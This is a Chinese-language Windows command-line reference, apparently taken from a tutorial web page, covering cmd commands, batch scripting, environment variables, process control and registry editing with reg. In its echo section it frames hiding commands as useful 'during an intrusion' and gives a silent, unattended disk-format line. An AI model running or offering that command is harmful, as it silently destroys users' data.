<尖括号内的文本 >  必须为其提供值的占位符
[方括号内的文本] 可选项
{大括号内的文本} 一组必需的项;选择一个
竖线(|) 互斥项的分隔符;选择一个
省略号 (...) 可以重复的项

【 help命令 帮助信息 】
1、所有命令加上 /？参数都会显示其用法
2、所有命令加上 --help

where命令查看命令所在的路径位置
where python

【 cmd> help 】
break       设置或清除扩展式CTRL+C检查
bcdedit     设置启动数据库中的属性以控制启动加载
cacls       显示或修改文件的访问控制列表(ACL)
chkdsk      检查磁盘并显示状态报告,最常用的参数是/F可以对文件错误进行修复
chkntfs     显示或修改启动时间磁盘检查
compact     显示或更改NTFS分区上文件的压缩
convert     将FAT卷转换成NTFS,不能转换当前驱动器
diskpart    显示或配置磁盘分区属性
doskey      编辑命令行、撤回Windows命令并创建宏
driverquery 显示当前设备驱动程序状态和属性
endlocal    结束批文件中环境更改的本地化
fsutil      显示或配置文件系统属性
gpresult    显示计算机或用户的组策略信息
graftabl    使Windows在图形模式下显示扩展字符集
icacls      显示、修改、备份或还原文件和目录的ACL
label       创建、更改或删除磁盘的卷标
openfiles   显示远程用户为了文件共享而打开的文件
prompt      更改Windows命令提示
recover     从损坏的或有缺陷的磁盘中恢复可读信息
setlocal    开始本地化批处理文件中的环境更改
sort        对输入排序
subst       将路径与驱动器号关联
verify      告诉windows是否进行验证,以确保文件正确写入磁盘
vol         显示磁盘卷标和序列号
wmic        在交互式命令shell中显示WMI信息
print       打印机打印一个文本文件

cls           清屏
calc          计算器
control       打开控制面板
msinfo32      打开系统信息面板
systeminfo    显示计算机的特定属性和配置
dxdiag        打开directX诊断工具查看系统信息
VER           显示Windows的版本
winver        检查Windows版本
bye           退出当前连接
quit          退出当前连接
exit          退出当前连接,退出CMD.EXE程序(命令解释程序)
wmimgmt.msc   打开windows管理体系结构(WMI)
services.msc  windows服务,强制关闭禁用相关服务
appwiz.cpl    打开系统应用程序管理
explorer      文件资源管理器,文件目录参数,资源管理器地址栏输入url会自动调用默认浏览器打开url
taskmgr       任务管理器,ctrl+shift+esc,ctrl + alt + del
regedt32      打开注册表编辑器
regedit       打开注册表编辑器
psr           屏幕录制截图形式
win + G       录制桌面视频,mp4格式,默认视频库
SnippingTool  开始-搜索-截图工具
write         写字板
notepad       打开记事本
osk           打开屏幕键盘
mspaint       画图板
mstsc         远程桌面连接
date          显示或设置系统时间
time          显示或设置系统时间
wiaacmgr      扫描仪和照相机向导
cleanmgr      磁盘清理
dxdiag        检查DirectX的信息,诊断工具
sfc           系统文件检查器,system file check,管理员运行
msconfig      系统配置
mmc           控制台根节点
devmgmt       设备管理器,device management
compmgmt      计算机管理,computer management
odbcad32      odbc数据源管理器
mem           查看计算机内存以及内存的使用情况

</pre>
</div>

<div id="sysdoscmd">
<h3>dos系统命令</h3><pre>
把文件拖进cmd里显示路径
执行或打开文件 文件路径+文件名+enter
Tab键自动补全

【 chcp命令 chcp 65001>nul命令解决cmd中文乱码 】
显示或设置活动代码页编号,想永久的更改cmd编码值需要修改注册表
65001   UTF-8代码页
950     繁体中文
936     简体中文默认的GBK
437     MS-DOS 美国英语

在运行中通过regedit进入注册表
找到HKEY_CURRENT_USER\Console\%SystemRoot%_system32_cmd.exe
新建一个DWORD(32位值),命名CodePage,值为65001(十进制)

方法二:
新建一个cmd.reg
内容输入如下,保存之后双击cmd.reg即可:
Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Console\%SystemRoot%_system32_cmd.exe]
"CodePage"=dword:0000fde9
"FontFamily"=dword:00000036
"FontWeight"=dword:00000190
"FaceName"="Consolas"
"ScreenBufferSize"=dword:232900d2
"WindowSize"=dword:002b00d2

【 title命令 】
设置CMD.EXE会话的窗口标题
title 新标题  # cmd窗口的标题栏变了

【 color命令 】
设置默认的控制台前景和背景颜色。
color [attr]
attr 指定控制台输出的颜色属性,颜色属性由两个十六进制数字指定,第一个为背景,第二个则为前景
无参数时该命令会将颜色还原到CMD.EXE启动时的颜色,这个值来自当前控制台窗口、/T开关或DefaultColor注册表值。
相同的前景和背景颜色时COLOR命令会将ERRORLEVEL设置为1
color fc  # 在亮白色背景上产生亮红色文字
color 02  # 黑底绿色

每个数字可以为以下任何值之一:
0=黑色 A=淡绿色
1=蓝色 B=淡浅绿
2=绿色 C=淡红色
3=湖蓝 D=淡紫色
4=红色 E=淡黄色
5=紫色 F=亮白色
6=黄色
7=白色
8=灰色
9=淡蓝

【 REM命令 和 :: 】
REM命令记录批处理文件或CONFIG.SYS中的注释(批注)
REM为注释命令,该命令后的内容不被执行,但能回显。

:: 也可以起到rem的注释作用,而且更简洁有效,但有两点需要注意:
第一、任何以冒号:开头的字符行,在批处理中都被视作标号,而直接忽略其后的所有内容。
有效标号:冒号后紧跟一个以字母数字开头的字符串,goto语句可以识别。
无效标号:冒号后紧跟一个非字母数字的特殊符号,goto无法识别的标号,可起到注释作用,所以::常被用作注释符号,:+也可起注释作用
第二、与rem不同的是, ::后的字符行在执行时不会回显,无论是否用echo on打开命令行回显状态,因为命令解释器不认为他是一个有效的命令行

rem在某些场合下将比::更为适用,rem可以用于config.sys文件中

rem注释在未关闭命令回显时会在屏幕显示出来,而::则什么情况下都不会显示

行内注释格式:%注释内容%(不常用,慎用)

【 echo命令 和 @ 】
@字符放在命令前将关闭该命令回显,无论此时echo是否为打开状态。
表示不显示@后面的命令,在入侵过程中自然不能让对方看到使用的命令。
@echo off
@echo Now initializing the program,please wait a minite...
@format X: /q/u/autoset  # format命令是不可以使用/y这个参数的,但微软留了个autoset参数,效果和/y一样

echo命令的作用:
(1)echo [{ on|off }]
@echo off
打开回显关闭回显功能,如果想关闭"ECHO OFF"命令行自身的显示需要在该命令行前加上"@"。

(2)echo
显示当前ECHO设置状态

(3)ECHO 信息内容
echo hello world  # hello world
echo "hello world"  # "hello world"

(4)在DOS提示符状态下键入ECHO OFF能够关闭DOS提示符的显示(不显示当前路径),使屏幕只留下光标,键入ECHO ON提示符才会重新出现

(5)ECHO.输出空行,即相当于输入一个回车
点号要紧跟在ECHO后面,否则将被当作提示信息输出到屏幕。.可以用,:;"／[\]＋等任一符号替代。
命令ECHO.输出的回车,经DOS管道转向可以作为其它命令的输入,比如echo.|time即相当于在TIME命令执行后给出一个回车,所以执行时系统会在显示当前时间后自动返回到DOS提示符状态

(6)答复命令中的提问
格式:ECHO 答复语|命令文件名
可以用于简化一些需要交互模式的命令(如:CHKDSK /F;FORMAT Drive:;del *.*)的操作,它是通过DOS管道命令把ECHO命令输出的预置答复语作为人机对话命令的输入。

# 在调用的命令出现人机对话时自动输入"Y"回车:
C:>ECHO Y|CHKDSK/F
C:>ECHO Y|DEL A :*.*

(7)建立新文件或增加文件内容
格式:ECHO 文件内容>文件名 或 ECHO 文件内容>>文件名
C:>ECHO @ECHO OFF>AUTOEXEC.BAT         // 建立自动批处理文件
C:>ECHO C:\CPAV\BOOTSAFE>>AUTOEXEC.BAT // 向自动批处理文件中追加内容
C:>TYPE AUTOEXEC.BAT                   // 显示该自动批处理文件

(8)向打印机输出打印内容或打印控制码
ECHO 打印机控制码>;PRN
ECHO 打印内容>;PRN

# 向M－1724打印机输入打印控制码。＜Alt＞156是按住Alt键在小键盘键入156,类似情况依此类推:
C:>ECHO +156+42+116>;PRN(输入下划线命令FS＊t)
C:>ECHO [email=+155@]+155@>;PRN[/email](输入初始化命令ESC@)
C:>ECHO.>;PRN(换行)

(9)使喇叭鸣响
C:>ECHO ^G
"^G"是在dos窗口中用Ctrl＋G或Alt＋007输入,输入多个^G可以产生多声鸣响。
使用方法是直接将其加入批处理文件中或做成批处理文件调用。

【 pause命令 】
暂停系统命令或批处理文件的执行并显示显示消息:
请按任意键继续. . .
Press any key to continue . . .

显示其他提示语:
Echo 其他提示语 & pause > nul   // 不显示:请按任意键继续. . .

Sample:
@echo off
:begin
copy a:*.* d:\back
echo Please put a new disk into driver A
pause
goto begin

在这个例子中,驱动器A中磁盘上的所有文件均复制到d:\back中。显示的注释提示您将另一张磁盘放入驱动器 A 时,pause 命令会使程序挂起,以便您更换磁盘,然后按任意键继续处理。

【 path命令 环境变量 】
path命令为可执行文件显示或设置搜索路径

windows系统cmd命令行设置、查看、更改环境变量

环境变量中的path值代表的是可执行文件的搜索路径,显示或设置DOS寻找.COM、.EXE、.BAT文件的所在目录,只要知道C:\windows\system32和C:\windows\system32\dllcache文件夹中程序名字就可以通过运行输入打开要打开的程序
在没有指定path环境变量时,用户发出的命令DOS首先判断其是否为内部命令,再查找当前目录中是否有主文件名是该命令的可执行文件,如果均不是则显示信息"Bad command or filename"。如果发出了指定路径的命令则在指定径中依次查找,仍找不到则出现上述提示
path=[[drive:]path[;…]]或path

1、查看当前所有可用的环境变量:输入set回车即可查看。

2、查看某个环境变量:输入"set 变量名"即可,比如想查看path变量的值即输入set path
打印当前变量:echo %PATH%
打印当前变量:path

3、修改环境变量:输入"set 变量名=变量内容"即可,比如将path设置为"d:\nmake.exe",只要输入set path="d:\nmake.exe"。此修改环境变量是指用现在的内容去覆盖以前的内容,并不是追加。比如设置了上面的path路径之后,如果再重新输入set path="c",再次查看path路径的时候,其值为"c:",而不是"d:\nmake.exe";"c"。

4、将某一变量设置为空:set 变量名=
set path=" 那么查看path的时候就为空。只在当前命令行窗口起作用。因此查看path的时候不要去右击"我的电脑"——"高级属性"。

5、给变量追加内容:set 变量名=%变量名%;变量内容
set path=%path%;d:\nmake.exe" 将d:\nmake.exe添加到path中,再次执行"set path=%path%;c:",那么使用set path语句来查看的时候将会有:d:\nmake.exe;c:,而不是像第3步中的只有c:
set PATH=C:\Program Files\EasyPHP5.3.0\php;%PATH%

以上为临时设置,如果要永久有效,用这样的步骤:
我的电脑 -> 属性 -> 高级 -> 环境变量 -> 系统变量 -> PATH -> 修改加入新的路径,重启计算机

一个程序启动时环境变量被复制到该程序所在的环境中,在该程序执行过程中不会被除该程序以外的其他程序所改变,假设启动了一个cmd程序,然后通过控制面板修改了环境变量设置,但已经启动了的cmd所拥有的环境变量并不会被改变。如果在修改环境变量之后启动cmd程序则该程序将拥有新的环境变量。
结论:修改环境变量之后,如果受影响的是应用程序,那么只要简单地重新启动此应用程序,环境变量的修改就会反映到该程序中,而不必重新启动计算机;但如果受影响的是系统服务就必须重新启动才能将环境变量的修改反映到系统服务中,因为没有办法在不重启计算机的情况下重新启动系统服务管理器

以修改环境变量"PATH"为例,修改完成后进入DOS命令提示符,输入:set PATH=C: ,关闭DOS窗口。再次打开DOS窗口,输入:echo %PATH% ,可以发现"我的电脑"->"属性"->"高级"->"环境变量"中设置的PATH值已经生效。

不用担心DOS窗口中的修改会影响环境变量的值,DOS窗口中的环境变量只是Windows环境变量的一个副本而已,但对副本的修改却会引发Windows环境变量的刷新

【 cmd命令 】
打开另一个Windows命令解释程序窗口
Starts a new instance of the Windows command interpreter

cmd
显示版本

【 start命令 】
启动单独的命令提示符窗口以运行指定的程序或命令,所有的DOS命令和命令行程序都可以由start命令来调用
如果start用在批处理中,该外部程序在新窗口中运行,批处理程序继续往下执行,不理会外部程序的运行状况;如果直接运行外部程序则必须等外部程序完成后才继续执行剩下的指令

START ["title"] [/D path] [/I] [/MIN] [/MAX] [/SEPARATE | /SHARED]
      [/LOW | /NORMAL | /HIGH | /REALTIME | /ABOVENORMAL | /BELOWNORMAL]
      [/NODE < NUMA node>] [/AFFINITY < hex affinity mask>] [/WAIT] [/B]
      [command/program] [parameters]

"title"     在窗口标题栏中显示的标题。
path        启动目录。
B           不创建新窗口。应用程序已忽略^C处理。除非应用程序启用^C处理,否则^Break是唯一可以中断该应用程序的方式。
I           新的环境将是传递给 cmd.exe 的原始环境,而不是当前环境。
MIN         以最小化方式启动窗口。
MAX         以最大化方式启动窗口。
WAIT        启动应用程序并等待它终止。
command/program
            如果它是内部cmd命令或批文件,则该命令处理器是使用cmd.exe的/K开关运行的,表示运行该命令之后该窗口将仍然存在。
            如果它不是内部cmd命令或批文件则它就是一个程序,并将作为一个窗口化应用程序或控制台应用程序运行。
parameters  这些是传递给command/program的参数。

在cmd命令行下让程序在后台执行: 在执行的命令前加上start /b,比如start /b run.bat,相当于Linux下的run.sh &
start /b redis-server 1>nul 2>nul

DOS命令打开浏览器
start explorer d:\    # 调用图形界面打开D盘
explorer http://www.weibo.com  # 默认浏览器打开打开指定网址
start "C:\Program Files\Google\Chrome\Application\chrome.exe" http://www.weibo.com/  # chrome浏览器指定网址
start iexplore.exe www.baidu.com  # ie浏览器打开网站
start www.baidu.com  # 默认浏览器打开网站

【 进程 】
tasklist    查看系统进程,显示包括服务在内的所有当前运行的任务
taskkill    杀死系统进程,中止或停止正在运行的进程或应用程序
taskkill /? 查看帮助

找到端口对应的进程PID,杀死进程
方法一:列出所有进程netstat -ano
方法二:直接根据端口找进程
netstat -ano|findstr "80"
TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       10712
tasklist|findstr "10712"
httpd.exe                    10712 Services                   0      1,604 K
taskkill /F /pid 10712
taskkill /F /IM php-cgi.exe

【 mode命令 】
配置系统设备

串行端口: MODE COMm[:] [BAUD=b] [PARITY=p] [DATA=d] [STOP=s] [to=on|off] [xon=on|off] [odsr=on|off] [octs=on|off] [dtr=on|off|hs] [rts=on|off|hs|tg] [idsr=on|off]

设备状态: MODE [device] [/STATUS]

打印重定向: MODE LPTn[:]=COMm[:]

选择代码页: MODE CON[:] CP SELECT=yyy

代码页状态: MODE CON[:] CP [/STATUS]

显示模式: MODE CON[:] [COLS=c] [LINES=n]

击键率: MODE CON[:] [RATE=r DELAY=d]

mode con cols=113 lines=35 & color 9f  // 设置DOS窗口颜色和缓冲大小:35行,113列

【 format命令 】
格式化磁盘

format E: /fs:NTFS
/fs 指定格式化后的文件系统,FAT FAT32 NTFS,格式化u盘建议FAT32格式,硬盘建议NTFS,因为NTFS支持单文件2TB(1TB=1024GB)
/v  指定卷标,卷标即磁盘分区时候的名字,默认是本地磁盘
/q  快速格式化,会完全清除磁盘,不可恢复
/x  强制卸下该卷进行格式化
/S  完成格式化,并将系统引导文件拷贝到该磁盘
/a:** 就是设置格式化后的单位大小,单位为千字节(kb)不加就是使用默认

【 shutdown命令 】
允许通过本地或远程方式正确关闭计算机

shutdown -s -t 3600  一小时后自动关机,写入bat后缀的文件内,双击即可运行批处理
/i 打开gui界面即图形操作界面,这必须是第一个选项
/t xxx 将关闭前的超时时间设置为xxx秒,有效范围0-315360000(10年),默认30,如果超时时间大于0则默示为/f参数。
/f 无警告强制关机,如果为/t参数指定大于0的值则默示为/f参数
/l 注销,这不能与/m或/d选项一起使用
/s 关闭计算机
/sg 关闭计算机。在下一次启动时如果启用了自动重启登录则将自动登录并锁定上次交互用户,登录后重启任何已注册的应用程序
/c 加注释,shutdown -s -c 'hello'
/a 取消关机,终止系统关闭,这只能在超时期间使用
/r 完全关闭并重新启动计算机
/g 完全关闭并重启计算机。重新启动系统后如果启用了自动重启登录则将自动登录并锁定上次交互用户,登录后重启任何已注册的应用程序
/h 休眠本地计算机,可以与/f选项一起使用

/d [p|u:]xx:yy
提供重新启动或关闭的原因,shutdown -d up就是用户计划内关闭计算机,p指示重启或关闭是计划内的,u指示原因是用户定义的,如果未指定p也未指定u则重新启动或关闭是计划外的,xx是主要原因编号(小于256的正整数),yy是次要原因编号(小于65536的正整数)。

【 logoff命令 】
注销命令,logoff 7把id为7的用户踢出去,可以踢自己默认是1或0

【 choice命令 】
使用choice命令可以让用户输入一个字符(用于选择),从而根据用户的选择返回不同的errorlevel,然后与if errorlevel配合,根据用户的选择运行不同的命令。
choice工具允许用户从选择列表选择一个项目并返回所选项目的索引。

CHOICE [/C choices] [/N] [/CS] [/T timeout /D choice] [/M text]

参数列表:
/C choices 指定要创建的选项列表,默认列表是'YN'。
/N         隐藏选项列表
/CS        允许选择分大小写的选项,默认不分大小写的。
/T timeout 做出默认选择之前暂停的秒数。可接受的值是从0到9999。如果指定了0就不会有暂停,默认选项会得到选择。
/D choice  在n秒之后指定默认选项。字符必须在用/C选项指定的一组选择中;同时必须用/T指定n
/M text    指定提示之前要显示的消息。如果没有指定,工具只显示提示。
/?         显示帮助消息。

ERRORLEVEL环境变量被设置为从选择集选择的键索引。列出的第一个选择返回1,第二个选择返回2,等等。如果用户按的键不是有效的选择,该工具会发出警告响声。如果该工具检测到错误状态会返回255的ERRORLEVEL值。如果用户按Ctrl+Break或Ctrl+C键,该工具会返回0的ERRORLEVEL值。在一个批程序中使用ERRORLEVEL参数时将参数降序排列。

CHOICE /?
CHOICE /C YNC /M "Press Y for Yes, N for No or C for Cancel."
CHOICE /T 10 /C ync /CS /D y

# 显示:Select a for option 1 and b for option 2. [A,B]?
CHOICE /C ab /M "Select a for option 1 and b for option 2."

# 输出:Select a for option 1 and b for option 2.
CHOICE /C ab /N /M "Select a for option 1 and b for option 2."

test.bat的内容:
@echo off
choice /C dme /M 'defrag,mem,end'
if errorlevel 3 goto end
if errorlevel 2 goto mem
if errotlevel 1 goto defrag
:defrag
c:\dos\defrag
goto end
:mem
mem
goto end
:end
echo good bye

此批处理运行后,将显示"defrag,mem,end[D,M,E]?",用户可选择d m e,然后if语句根据用户的选择作出判断,d表示执行标号为defrag的程序段,m表示执行标号为mem的程序段,e表示执行标号为end的程序段,每个程序段最后都以goto end将程序跳到end标号处,然后程序将显示good bye,批处理运行结束。

【 goto命令 】
将Windows命令解释程序定向到批处理程序中某个带标签的行

</pre>

<h4>gpedit命令 gpeit.msc本地策略组</h4><pre>
gpedit命令本地组策略编辑器

改组策略方式禁用win10系统的Cortana
1、使用 Win + R 组合键,运行中输入 gpedit.msc 打开组策略编辑器
2、导航定位到 计算机配置 -> 管理模板 -> Windows组件 -> 搜索 
3、在右侧面板中找到 允许使用 Cortana 的条目,将其设置为 已禁用 即可

</pre>

<h4>注册表 regedit命令 reg命令</h4><pre>
注册表(Registry,Windows Operating System Registry)是Microsoft Windows中的一个重要的数据库,用于存储系统和应用程序的设置信息,其中存放着各种参数,直接控制着windows的启动、硬件驱动程序的装载以及一些windows应用程序的运行,从而在整个系统中起着核心作用。这些作用包括了软、硬件的相关配置和状态信息,比如注册表中保存有应用程序和资源管理器外壳的初始条件、首选项和卸载数据等,联网计算机的整个系统的设置和各种许可,文件扩展名与应用程序的关联,硬件部件的描述、状态和属性,性能记录和其他底层的系统状态信息,以及其他数据等。

在启动Windows时Registry会对照已有硬件配置数据,检测新的硬件信息;系统内核从Registry中选取信息,包括要装入什么设备驱动程序及依什么次序装入,内核传送回它自身的信息,例如版权号等;同时设备驱动程序也向Registry传送数据,并从Registry接收装入和配置参数,一个好的设备驱动程序会告诉Registry它在使用什么系统资源,例如硬件中断或DMA通道等,另外设备驱动程序还要报告所发现的配置数据;为应用程序或硬件的运行提供增加新的配置数据的服务。配合ini文件兼容16位Windows应用程序,当安装—个基于Windows 3.x的应用程序时,应用程序的安装程序Setup像在windows中—样创建它自己的INI文件或在win.ini和system.ini文件中创建入口;同时windows还提供了大量其他接口,允许用户修改系统配置数据,例如控制面板、设置程序等。

注册表的作用是保存程序所需要的信息,当程序需要这些信息时就从注册表里读出,因此注册表最基本的功能就是保存信息

如果注册表受到了破坏,轻则使windows的启动过程出现异常,重则可能会导致整个windows系统的完全瘫痪,只有在别无选择的情况下才直接编辑注册表,注册表编辑器会忽略标准的安全措施,从而使得这些设置会降低性能、破坏系统,甚至要求用户重新安装Windows。

使用Reg直接编辑本地或远程计算机的注册表,这些更改有可能造成计算机无法操作并需要重新安装操作系统,所以不要直接编辑注册表,而应尽可能利用“控制面板”或“Microsoft管理控制台(MMC)”更改注册表中的程序安全更改多数注册表设置,如果必须直接编辑注册表请先将其备份。有些操作可以查看或配置本地或远程计算机的注册表项,而另外一些则只允许配置本地计算机的注册表设置,同时远程访问注册表也可能会限制用于某操作的参数。请检查每个操作的语法以便验证该操作可以用于远程计算机,以及验证可用于那种情况下的参数

命令行通过regedit可以手动打开注册表查看相关信息,在页面上看到左边有很多树形结构的内容,可以简单的把它等同于目录,最顶端的5个根键所包括的内容分别是

1.)HKEY_CLASSES_ROOT
定义了系统中所有文件类型标志和基本操作标志
记录windows操作系统中所有数据文件的格式和关联信息,主要记录不同文件的文件名后缀和与之对应的应用程序其下子键可分为两类:一类是已经注册的各类文件的扩展名,这类子键前面都带有一个".";另一类是各类文件类型有关信息

2.)HKEY_CURRENT_USER
当前用户的配置信息,包括环境变量、桌面设置、网络连接,软件运行信息等
这些信息保证不同的用户登录计算机时,使用自己的修改化设置,例如自己定义的墙纸,自己的收件箱,自己的安全访问权限

3.)HKEY_LOCAL_MACHINE
本机相关的系统信息,包括硬件信息,驱动信息,内存数据,总线数据等等。
此根键包含了当前计算机的配置,包括所安装的硬件及软件设置,这些信息是为所有的用户登录系统服务的,这是注册表中最庞大也是最重要的根键

4.) HKEY_USER
这里记录了本机器上所有用户的设置

5.)KKEY_CURRENT_CONFIG
包括字体、BIOS、操作系统、打印机等四项的配置信息。该字段是HKEY_LOCAL_MACHINE\Config的副本

其中1,4,5,项根键一般只是读取一些信息,而2,3两项根键下就会写入一些应用程序自己的配置信息,所以用的最多的是这两个位置
HKEY_CURRENT_USER \ SOFTWARE
HKEY_LOCAL_MACHINE \ SOFTWARE

放在HKEY_CURRENT_USER中的信息只有当前用户能看到,如果log off换个用户就不到了,而放HKEY_LOCAL_MACHINE下面的信息所有用户都能看到.
不过打开注册表发现平时用的大部分软件都是把配置信息放HKEY_CURRENT_USER\ SOFTWARE下

注册表键值内容
那一层层树形结构就像一个个目录一样,它本身就是起组织内容的作用,而真正需要的信息是在目录的最后一层,打开后会在右边看到三列
Name,Type,Data其中的Type只是起描述作用,所以真正用到的是Name和Data,name就是键名,data是键值
注册表里常用的类型是REG_SZ,可以简单的看成是个字符串像Char* 或者CString
另一个是REG_DWORD,这保存的是数值,就可以看成DWORD (unsigned long)

windows注册表值类型:
REG_SZ 字符串值
REG_BINARY 二进制值
REG_DWORD DWORD值
REG_MULTI_SZ 多字符串值
REG_EXPAND_SZ 可扩充字符串值

【 regedit命令 】
filename  导入.reg文件进注册表
/s        导入.reg文件进注册表(安静模式)
/e        导出注册表文件,例：regedit /e filename.reg HKEY_LOCAL_MACHINE/SYSTEM
/L:system 指定system.dat
/R:user   指定user.dat
/C        压缩 [文件名] (Windows 98) 

REGEDIT[/L:system][/R:user]filename1
REGEDIT[/L:system][/R:user]/C filename2
REGEDIT[/L:system][/R:user]/E filename3 [regpath]

其中：
/L:system 指定system.dat文件的存放位置。
/R:user 指定user.dat文件的存放位置。
filename1 指定引入到注册表数据库的文件名。
/C filename2 指定形成注册表数据库的文件名。
/E filename3 指定导出注册表文件的文件名。
regpath 指定导出注册表文件的开始关键字(缺省为全部关键字)

【 reg命令 】
Reg命令是Windows提供的一下专门操作注册表的工具,可以方便的查询,添加,删除,导入,导出,比较等操作,具体可以参考系统自带的帮助

>reg /?
REG Operation [Parameter List]
Operation  [ QUERY | ADD | DELETE | COPY | SAVE | LOAD | UNLOAD | RESTORE | COMPARE | EXPORT | IMPORT  | FLAGS ]

Return Code: (Except for REG COMPARE)
0 - Successful
1 - Failed

For help on a specific operation type:
REG QUERY /?
REG ADD /?
REG DELETE /?

【 reg query 】
返回注册表的子项下的项和下一层子项的列表,返回值:0成功,1失败
语法:reg query KeyName [{/v EntryName|/ve}] [/s]

KeyName指定子项的完全路径。对于远程计算机,请在 \\ComputerName\PathToSubkey 中的子项路径前包含计算机名称。忽略 ComputerName 会导致默认对本地计算机进行操作。以相应的子目录树开始路径。有效子目录树为 HKLM、HKCU、HKCR、HKU 以及 HKCC。如果指定远程计算机,则只可使用 HKLM 和 HKU 子目录树。

/v EntryName : 返回特定的项及其值。该参数只返回直接位于指定子项的下一层中的项。将会找不到当前子项下的子项中的项。如果省略EntryName则将返回子项下的所有项。
/ve : 指定仅返回为空值的项。
/s : 将返回各个层中的所有子项和项。如果不使用该参数将只返回下一层的子项和项。
/? : 在命令提示符显示帮助。

reg query "hklm\system\currentcontrolset\control\session manager" /v maxstacktracedepth
reg query "hkcu\software\microsoft\winmine" /s

查询所有子项和值
>reg query hklm\software\node.js

HKEY_LOCAL_MACHINE\software\node.js
    InstallPath    REG_SZ    E:\soft\node\
    Version    REG_SZ    10.16.0

HKEY_LOCAL_MACHINE\software\node.js\Components

>reg query hklm\software\node.js\components

HKEY_LOCAL_MACHINE\software\node.js\components
    EnvironmentPathNode    REG_DWORD    0x1

查询特定项
>reg query hklm\software\node.js\components /v EnvironmentPathNode

HKEY_LOCAL_MACHINE\software\node.js\components
    EnvironmentPathNode    REG_DWORD    0x1

查询当前设备的语言环境
>reg query "HKEY_CURRENT_USER\Control Panel\International" /v  LocaleName
HKEY_CURRENT_USER\Control Panel\International
    LocaleName    REG_SZ    zh-CN

@ECHO OFF
for /f "tokens=1,2,3,4,*" %%i in ('reg query HKEY_LOCAL_MACHINE\software\node.js ^| find /i "InstallPath"') do SET "nodepath=%%k"
echo node.js的InstallPath值为:%nodepath%

</pre><textarea>@echo off

set LocaleName=
set sCountry=
set sShortDate=
set Hostname=
set BaiduYunInstallDir=

for /f "tokens=3" %%a in ('"reg query "HKEY_CURRENT_USER\Control Panel\International" /v  LocaleName"') do (set LocaleName=%%a)
for /f "tokens=3" %%a in ('"reg query "HKEY_CURRENT_USER\Control Panel\International" /v  sCountry"') do (set sCountry=%%a)
for /f "tokens=3" %%a in ('"reg query "HKEY_CURRENT_USER\Control Panel\International" /v  sShortDate"') do (set sShortDate=%%a)
for /f "tokens=3" %%a in ('"reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v Hostname"') do (set Hostname=%%a)
for /f "tokens=3" %%a in ('"reg query "HKEY_CURRENT_USER\Software\Baidu\BaiduYunGuanjia" /v installDir"') do (set BaiduYunInstallDir=%%a)

echo LocaleName:%LocaleName%
echo sCountry:%sCountry%
echo sShortDate:%sShortDate%
echo Hostname:%Hostname%
echo BaiduYunInstallDir:%BaiduYunInstallDir%

reg add HKEY_CURRENT_USER\cp\

pause

</textarea><pre>
【 reg add 】
将新的子项或项添加到注册表中,reg add操作的返回值:0成功,1失败,该操作不能添加子树,该版本的Reg在添加子项时无需请求确认
语法:reg add KeyName [/v EntryName|/ve] [/t DataType] [/s separator] [/d value] [/f]

参数
KeyName
指定子项的完全路径。对于远程计算机请在\\ComputerName\PathToSubkey中的子项路径前包含计算机名称。忽略ComputerName会导致默认对本地计算机进行操作。以相应的子目录树开始路径,有效子目录树为HKLM、HKCU、HKCR、HKU以及HKCC,远程机器上只有HKLM和HKU
HKCR: HKEY_CLASSES_ROOT
HKCU: HKEY_CURRENT_USER
HKLM: HKEY_LOCAL_MACHINE
HKU: HKEY_USERS
HKCC: HKEY_CURRENT_CONFIG

/v EntryName : 指定要添加到指定子项下的项名称,所选项之下要添加的值名
/ve : 指定添加到注册表中的项为空值,为注册表项添加空白值名(默认)
/t DataType : 指定项值的数据类型,DataType可以是以下几种类型:
REG_SZ(默认)、REG_MULTI_SZ、REG_DWORD_BIG_ENDIAN、REG_DWORD、REG_BINARY、REG_DWORD_LITTLE_ENDIAN、REG_LINK、REG_FULL_RESOURCE_DESCRIPTOR、REG_EXPAND_SZ
/s separator : 当REG_MULTI_SZ指定为数据类型且需要列出多个项使用该参数指定用于分隔多个数据实例的字符,默认"\0"。
/d value : 指定新注册表项的值,要分配给添加的注册表ValueName的数据
/f : 不用询问信息而直接添加子项或项,不用提示就强行覆盖现有注册表项
/? : 在命令提示符显示帮助。

在注册表中创建一些新的项:
>reg add "HKEY_CURRENT_USER\cp\%date:~0,4%\%date:~5,2%\%date:~8,2%\%time:~0,2%\1"
>reg add "HKEY_CURRENT_USER\cp\%date:~0,4%\%date:~5,2%\%date:~8,2%\%time:~0,2%\2"
>reg add "HKEY_CURRENT_USER\cp\%date:~0,4%\%date:~5,2%\%date:~8,2%\%time:~0,2%\3"
>reg add "HKEY_CURRENT_USER\cp\%date:~0,4%\%date:~5,2%\%date:~8,2%\%time:~0,2%\4"

REG ADD \\ABC\HKLM\Software\MyCo
添加远程机器 ABC 上的一个注册表项 HKLM\Software\MyCo

REG ADD HKLM\Software\MyCo /v Data /t REG_BINARY /d fe340ead
添加一个值(名称: Data,类型: REG_BINARY,数据: fe340ead)

REG ADD HKLM\Software\MyCo /v MRU /t REG_MULTI_SZ /d fax\0mail
添加一个值(名称: MRU,类型: REG_MUTLI_SZ,数据: fax\0mail\0\0)

REG ADD HKLM\Software\MyCo /v Path /t REG_EXPAND_SZ /d ^%systemroot^%
添加一个值(名称: Path,类型: REG_EXPAND_SZ,数据: %systemroot%),在扩充字符串中使用插入符号 ( ^ )

reg add HKLM\System\CurrentControlSet\Services\HTTP\Parameters /v MaxConnections /t REG_DWORD /d 100000
reg add HKLM\SYSTEM\CurrentControlSet\services\NlaSvc\Parameters\Internet /v EnableActiveProbing /t REG_DWORD /d 1

reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\explorer\Advanced\Folder\Hidden\SHOWALL" /v Checkedvalue /t reg_dword /d 1 /f(显示隐藏的文件和文件夹)

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v systray /t REG_SZ /d "%SystemRoot%\system32\systray.exe" /f(开机启动音量控制)

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "%SystemRoot%\explorer.exe" /f(开机启动explorer外壳程序)

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v SoundMan /t REG_SZ /d "%SystemRoot%\SOUNDMAN.exe" /f(开机启动AC97音效管理员程序)

